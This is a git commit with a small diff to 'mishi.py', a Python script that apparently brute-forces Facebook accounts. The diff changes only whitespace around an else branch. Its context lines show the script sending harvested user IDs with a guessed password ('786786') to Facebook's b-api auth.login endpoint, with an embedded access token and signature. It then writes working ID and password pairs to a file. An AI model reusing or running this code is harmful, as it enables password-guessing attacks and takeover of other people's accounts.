3550a67584354f9173ebadaf1a9c85e25db0c0ef
Jam Shahrukh <64614842+jamshahrukh@users.noreply.github.com>
2020-05-04 04:43:27 +0500

    Update mishi.py

--- mishi.py
+++ mishi.py
@@ -395,7 +395,8 @@ def pilih_super():
 				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
 				                                       cek.close()
 				                                       cekpoint.append(user+pass4)					
-					                           else:									
+					                         
+								else:									
 						                       pass5 = '786786'							
 						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
 						                       q = json.load(data)								
